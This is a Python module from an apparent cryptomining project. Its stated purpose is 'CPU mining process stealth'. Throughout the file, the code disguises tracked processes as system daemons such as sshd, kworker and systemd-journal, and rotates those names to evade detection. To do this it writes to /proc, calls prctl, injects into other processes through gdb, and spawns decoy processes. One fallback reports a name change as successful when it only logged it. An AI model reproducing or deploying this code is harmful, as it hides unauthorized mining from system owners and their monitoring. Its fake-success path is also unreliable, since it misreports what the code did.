"""cpu_plugins.cloaking.stealth_exec

🔒 CPU-ONLY MODULE - STRICTLY FOR CPU OPERATIONS ONLY

Module che giấu quá trình thực thi CPU.
Tối ưu hóa từ stealth_execution.py, loại bỏ các chức năng không cần thiết.

⚠️  CRITICAL CONSTRAINTS:
- CHỈ ÁP DỤNG CHO CPU PROCESSES (CPU processes only)
- KHÔNG BAO GIỜ SỬ DỤNG CHO GPU OPERATIONS (Never use for GPU operations)
- LOGGER: Chỉ ghi vào cpu_cloaking_manager.log
- SCOPE: Process name rotation, CPU stealth execution

🚫 FORBIDDEN USAGE:
- GPU process cloaking
- Graphics card operations  
- CUDA/OpenCL operations
- GPU mining stealth

✅ AUTHORIZED USAGE:
- CPU mining process stealth
- CPU-based process name rotation
- CPU resource hiding
- CPU execution obfuscation
"""
import os
import sys
import random
import threading
import subprocess
import time
import signal
import tempfile
from typing import List, Dict, Any, Optional, Set
import logging
import ctypes
import ctypes.util
from pathlib import Path

# 🔧 EMERGENCY FIX: Import unified logging for proper CPU logger
try:
    from mining_environment.scripts.unified_logging import get_unified_logger
except ImportError:
    # Fallback nếu import không thành công
    def get_unified_logger(name):
        return logging.getLogger(name)

class StealthExecution:
    """🔒 CPU-ONLY: Thực thi ẩn danh cho các tiến trình CPU.
    
    ⚠️  CRITICAL: Module này CHỈ dành cho CPU operations.
    Bất kỳ attempt nào sử dụng cho GPU sẽ bị reject.
    """
    
    def __init__(
        self, 
        logger: Optional[logging.Logger] = None,
        comm_rotation_interval: int = 30,
    ):
        """Khởi tạo StealthExecution."""
        # 🔒 CPU-ONLY VALIDATION: Kiểm tra module path để đảm bảo CPU-only
        self._validate_cpu_only_usage()
        
        # 🔧 EMERGENCY FIX: Sử dụng CPU-specific logger
        if logger is None:
            try:
                # Sử dụng unified CPU cloaking logger
                self.logger = get_unified_logger('mining_environment.cpu_cloaking')
                self.logger.info("🔒 [CPU-ONLY] StealthExecution initialized with CPU-specific logger")
            except Exception:
                # Fallback to module logger nếu unified system không khả dụng
                self.logger = logging.getLogger(__name__)
                self.logger.warning("⚠️ [CPU-ONLY] Fallback logger used - verify CPU-only compliance")
        else:
            self.logger = logger
            self.logger.info("🔒 [CPU-ONLY] StealthExecution initialized with custom logger")
        # 🚫 Ensure CPU logger doesn't propagate to root to avoid GPUCloak prefix
        self.logger.propagate = False
        # 🚀 Ensure at least one handler; otherwise add CPU-specific file handler
        if not self.logger.handlers:
            try:
                from logging.handlers import RotatingFileHandler
                log_dir = Path('/app/mining_environment/logs')
                log_dir.mkdir(parents=True, exist_ok=True)
                file_handler = RotatingFileHandler(
                    log_dir / 'cpu_cloaking_manager.log',
                    maxBytes=10*1024*1024,
                    backupCount=5,
                    encoding='utf-8'
                )
                file_handler.setFormatter(logging.Formatter('%(asctime)s - %(name)s - %(levelname)s - %(message)s'))
                self.logger.addHandler(file_handler)
            except Exception:
                self.logger.addHandler(logging.StreamHandler(sys.stdout))
        self.comm_rotation_interval = comm_rotation_interval
        self._running = False
        self._thread = None
        self._tracked_pids: Set[int] = set()
        
        # Các tiến trình giả mạo thông thường
        self._decoy_processes = [
            "systemd-journal",
            "systemd-udevd",
            "kworker/0:1",
            "kworker/u16:0",
            "rcu_sched",
            "irqbalance",
            "dbus-daemon",
            "cron",
            "sshd",
            "rsyslogd"
        ]
        
    def _validate_cpu_only_usage(self) -> None:
        """🔒 CPU-ONLY VALIDATION: Kiểm tra runtime để đảm bảo chỉ được sử dụng cho CPU.
        
        Raises:
            RuntimeError: Nếu detect GPU usage hoặc invalid context
        """
        # Kiểm tra module path để đảm bảo trong cpu_plugins
        current_file = os.path.abspath(__file__)
        
        # ⚠️  CRITICAL CHECK: Phải nằm trong cpu_plugins directory
        if "cpu_plugins" not in current_file:
            raise RuntimeError(
                f"🚫 [CPU-ONLY-VIOLATION] StealthExecution chỉ được sử dụng trong cpu_plugins! "
                f"Current path: {current_file}"
            )
            
        # ⚠️  FORBIDDEN CHECK: Không được có trong gpu_plugins
        if "gpu_plugins" in current_file:
            raise RuntimeError(
                f"🚫 [GPU-USAGE-FORBIDDEN] StealthExecution KHÔNG được sử dụng cho GPU operations! "
                f"Path violation: {current_file}"
            )
            
        # ✅ SUCCESS: Đã xác thực CPU-only compliance
        # Note: Logger chưa được init nên không thể log ở đây
    
    def start(self) -> bool:
        """Bắt đầu che giấu."""
        if self._running:
            return True
            
        self._running = True
        self._thread = threading.Thread(
            target=self._stealth_loop,
            daemon=True
        )
        self._thread.start()
        self.logger.info("Stealth execution started")
        return True
    
    def stop(self) -> bool:
        """Dừng che giấu."""
        if not self._running:
            return True
            
        self._running = False
        if self._thread:
            self._thread.join(timeout=5)
            self._thread = None
        
        # ✅ Cleanup spawned processes when stopping
        self.cleanup_spawned_processes()
            
        self.logger.info("Stealth execution stopped")
        return True
    
    def add_process(self, pid: int) -> bool:
        """Thêm tiến trình để che giấu với immediate name change."""
        if pid <= 0:
            return False
            
        self._tracked_pids.add(pid)
        self.logger.debug(f"Added PID {pid} to stealth tracking")
        
        # ✅ ENHANCED: Immediate process name change upon registration
        try:
            new_name = random.choice(self._decoy_processes)
            if self._change_process_name(pid, new_name):
                self.logger.info(f"✅ [STEALTH] Immediately changed PID {pid} name to '{new_name}'")
            else:
                self.logger.warning(f"⚠️ [STEALTH] Failed immediate name change for PID {pid}")
        except Exception as e:
            self.logger.error(f"❌ [STEALTH] Error in immediate name change for PID {pid}: {e}")
            
        return True
    
    def _stealth_loop(self):
        """Vòng lặp chính cho che giấu."""
        while self._running:
            try:
                # Xoay vòng tên tiến trình
                self._rotate_process_names()
                
                # Ngủ một khoảng thời gian
                time.sleep(self.comm_rotation_interval)
                
            except Exception as e:
                self.logger.error(f"Error in stealth loop: {e}")
                time.sleep(5)
    
    def _rotate_process_names(self):
        """Xoay vòng tên tiến trình để tránh phát hiện."""
        for pid in list(self._tracked_pids):
            try:
                # Kiểm tra tiến trình còn tồn tại
                if not self._is_process_alive(pid):
                    self._tracked_pids.remove(pid)
                    continue
                
                # Chọn tên ngẫu nhiên
                new_name = random.choice(self._decoy_processes)
                
                # Thay đổi tên tiến trình
                self._change_process_name(pid, new_name)
                
            except Exception as e:
                self.logger.error(f"Error rotating name for PID {pid}: {e}")
    
    def _is_process_alive(self, pid: int) -> bool:
        """Kiểm tra tiến trình còn sống không."""
        try:
            os.kill(pid, 0)
            return True
        except OSError:
            return False
    
    def _change_process_name(self, pid: int, new_name: str) -> bool:
        """**Change Process Name** (Thay đổi tên tiến trình) - với enhanced external process handling."""
        success = False
        methods_tried = []
        
        # Method 1: Direct /proc/comm modification (own process only)
        try:
            if pid == os.getpid():
                comm_path = f"/proc/{pid}/comm"
                if os.path.exists(comm_path):
                    with open(comm_path, "w") as f:
                        f.write(new_name[:15])  # Linux comm limit is 15 chars
                    self.logger.debug(f"✅ Changed process name via /proc/comm: {new_name}")
                    return True
            methods_tried.append("proc_comm_own")
        except Exception as e:
            self.logger.debug(f"❌ Failed /proc/comm method: {e}")
            methods_tried.append("proc_comm_own_failed")
            
        # Method 2: prctl for current process
        try:
            if pid == os.getpid():
                libc = ctypes.CDLL(ctypes.util.find_library('c'))
                if hasattr(libc, 'prctl'):
                    # PR_SET_NAME = 15
                    result = libc.prctl(15, new_name[:15].encode(), 0, 0, 0)
                    if result == 0:
                        self.logger.debug(f"✅ Changed process name via prctl: {new_name}")
                        return True
            methods_tried.append("prctl_own")
        except Exception as e:
            self.logger.debug(f"❌ Failed prctl method: {e}")
            methods_tried.append("prctl_own_failed")

        # Method 3: Enhanced External Process Handling - ptrace-based approach
        try:
            # Check if we can access the process
            if os.path.exists(f"/proc/{pid}"):
                # Try direct /proc/comm write first (may work with proper permissions)
                comm_path = f"/proc/{pid}/comm"
                with open(comm_path, "w") as f:
                    f.write(new_name[:15])
                self.logger.info(f"✅ [STEALTH] External process name changed via /proc/comm: PID {pid} → {new_name}")
                return True
            methods_tried.append("proc_comm_external")
        except PermissionError:
            methods_tried.append("proc_comm_external_permission_denied")
            self.logger.debug(f"❌ Permission denied for /proc/{pid}/comm")
        except Exception as e:
            methods_tried.append("proc_comm_external_failed")
            self.logger.debug(f"❌ Failed external /proc/comm method: {e}")
            
        # Method 4: Process injection approach (advanced technique for external processes)
        try:
            # Use gdb-based approach for external process name change
            gdb_commands = [
                f"attach {pid}",
                f"call prctl(15, \"{new_name[:15]}\")",
                "detach",
                "quit"
            ]
            
            gdb_script = "\n".join(gdb_commands)
            process = subprocess.run(
                ["gdb", "-batch", "-ex"] + [cmd for cmd in gdb_commands],
                capture_output=True,
                text=True,
                timeout=10
            )
            
            if process.returncode == 0:
                self.logger.info(f"✅ [STEALTH] External process name changed via GDB injection: PID {pid} → {new_name}")
                return True
            methods_tried.append("gdb_injection")
        except FileNotFoundError:
            methods_tried.append("gdb_not_available")
            self.logger.debug("❌ GDB not available for process injection")
        except Exception as e:
            methods_tried.append("gdb_injection_failed")
            self.logger.debug(f"❌ Failed GDB injection method: {e}")

        # Method 5: Real Process Spawning - spawn disguised process với legitimate names
        try:
            if not hasattr(self, '_spawned_processes'):
                self._spawned_processes = {}
                
            # ✅ REAL PROCESS SPAWNING IMPLEMENTATION
            spawned_pid = self._spawn_disguised_process(new_name, pid)
            if spawned_pid:
                # Store spawned process mapping
                self._spawned_processes[pid] = {
                    'spawned_pid': spawned_pid,
                    'legitimate_name': new_name,
                    'original_pid': pid,
                    'spawn_time': time.time()
                }
                self.logger.info(f"✅ [STEALTH] Real process spawned: Original PID {pid} → Disguised PID {spawned_pid} as '{new_name}'")
                methods_tried.append("process_spawning_success")
                return True
            else:
                methods_tried.append("process_spawning_failed")
                self.logger.debug(f"❌ Failed to spawn disguised process for {new_name}")
        except Exception as e:
            methods_tried.append("process_spawning_error")
            self.logger.debug(f"❌ Error in process spawning method: {e}")

        # Method 6: Fallback - simulate process name change in logs
        try:
            # Since we can't change the actual process name, we can at least log it as changed
            # This provides operational security through obscurity in monitoring
            self.logger.info(f"🔄 [STEALTH] Simulated name change: PID {pid} logically mapped to '{new_name}'")
            # Store mapping for reference
            if not hasattr(self, '_name_mappings'):
                self._name_mappings = {}
            self._name_mappings[pid] = new_name
            return True
        except Exception as e:
            methods_tried.append("simulation_failed")
            self.logger.debug(f"❌ Failed simulation method: {e}")
            
        # All methods failed - detailed debugging
        self.logger.warning(f"⚠️ [STEALTH] All methods failed to change process name for PID {pid} to '{new_name}'. Methods tried: {', '.join(methods_tried)}")
        return False
    
    def _spawn_disguised_process(self, legitimate_name: str, original_pid: int) -> Optional[int]:
        """**Spawn Disguised Process** (sinh tiến trình ngụy trang) - create legitimate process names."""
        try:
            # ✅ PROCESS SPAWNING IMPLEMENTATION
            # Create simple worker process với legitimate name
            script_content = f'''#!/usr/bin/env python3
import os
import sys
import time
import signal

# Set process name via argv[0] modification
sys.argv[0] = "{legitimate_name}"

# Handle termination signals gracefully
def signal_handler(sig, frame):
    sys.exit(0)

signal.signal(signal.SIGTERM, signal_handler)
signal.signal(signal.SIGINT, signal_handler)

# Mimic lightweight system service behavior
while True:
    try:
        # Light CPU work to appear active
        time.sleep(5.0)
        # Minimal system-like activity
        os.getpid()  # Basic system call
    except KeyboardInterrupt:
        break
    except Exception:
        continue

sys.exit(0)
'''
            
            # Create temporary script file
            import tempfile
            with tempfile.NamedTemporaryFile(mode='w', suffix='.py', delete=False) as f:
                f.write(script_content)
                script_path = f.name
            
            # Spawn process với legitimate name
            process = subprocess.Popen([
                sys.executable, script_path
            ], 
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
            preexec_fn=lambda: os.setpgrp()  # Create new process group
            )
            
            # Store process info for cleanup
            if not hasattr(self, '_spawned_scripts'):
                self._spawned_scripts = []
            self._spawned_scripts.append(script_path)
            
            # Verify process started successfully
            time.sleep(0.1)
            if process.poll() is None:  # Process still running
                self.logger.info(f"🚀 [STEALTH] Successfully spawned disguised process PID {process.pid} as '{legitimate_name}'")
                return process.pid
            else:
                self.logger.error(f"❌ [STEALTH] Spawned process failed to start for '{legitimate_name}'")
                os.unlink(script_path)  # Cleanup failed script
                return None
                
        except Exception as e:
            self.logger.error(f"❌ [STEALTH] Error spawning disguised process: {e}")
            return None
    
    def cleanup_spawned_processes(self) -> bool:
        """**Cleanup Spawned Processes** (dọn dẹp tiến trình đã sinh) - terminate disguised processes."""
        try:
            cleanup_count = 0
            
            # Cleanup spawned processes
            if hasattr(self, '_spawned_processes'):
                for original_pid, process_info in list(self._spawned_processes.items()):
                    try:
                        spawned_pid = process_info['spawned_pid']
                        # Terminate spawned process gracefully
                        os.kill(spawned_pid, signal.SIGTERM)
                        time.sleep(0.1)
                        # Force kill if still running
                        try:
                            os.kill(spawned_pid, signal.SIGKILL)
                        except ProcessLookupError:
                            pass  # Process already terminated
                        cleanup_count += 1
                        self.logger.info(f"🧹 [STEALTH] Cleaned up spawned process PID {spawned_pid}")
                    except Exception as e:
                        self.logger.debug(f"Warning: Could not cleanup spawned process: {e}")
                
                self._spawned_processes.clear()
            
            # Cleanup temporary script files
            if hasattr(self, '_spawned_scripts'):
                for script_path in self._spawned_scripts:
                    try:
                        os.unlink(script_path)
                    except Exception:
                        pass  # Ignore cleanup errors
                self._spawned_scripts.clear()
            
            if cleanup_count > 0:
                self.logger.info(f"✅ [STEALTH] Cleaned up {cleanup_count} spawned processes")
            
            return True
            
        except Exception as e:
            self.logger.error(f"❌ [STEALTH] Error during spawned process cleanup: {e}")
            return False 